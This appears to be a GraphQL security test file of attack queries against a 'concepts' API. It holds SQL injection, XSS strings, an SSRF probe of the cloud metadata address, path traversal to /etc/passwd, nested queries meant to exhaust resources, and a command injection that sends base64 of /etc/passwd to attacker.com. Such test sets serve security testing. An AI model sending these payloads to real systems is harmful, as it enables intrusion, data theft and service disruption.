query.query:
query concepts {
  concepts {
    items {
      id
      type
      identifier
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query concepts {
  concepts(after: "1' UNION SELECT NULL,table_name FROM information_schema.tables--") {
    items {
      id
      type
    }
  }
}

query concepts {
  concepts {
    items {
      descriptions {
        name(text: "<img src=x onerror=alert(1)>")
        languageCode
      }
    }
  }
}

query concepts {
  concepts {
    items {
      uri(input: "http://169.254.169.254/latest/meta-data/")
      identifier
    }
  }
}

query concepts {
  concepts {
    items {
      systemEvents {
        logMessage(value: "; curl http://attacker.com/$(cat /etc/passwd | base64)")
      }
    }
  }
}

query concepts {
  concepts {
    items {
      links {
        description(value: "../../../../etc/passwd")
      }
    }
  }
}

query concepts {
  concepts {
    items {
      annotations {
        body(text: "<h1>Hacked</h1><iframe src='javascript:alert(1)'></iframe>")
      }
    }
  }
}

query concepts {
  concepts(first: 1000) {
    items {
      id
      type
      related {
        id
        narrower {
          id
        }
      }
    }
  }
}

query concepts {
  s: concepts(first: 1000) {
    i: items {
      x: id
      y: type
      r: related {
        z: id
        n: narrower {
          a: id
        }
      }
    }
  }
}

query {
  concepts {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
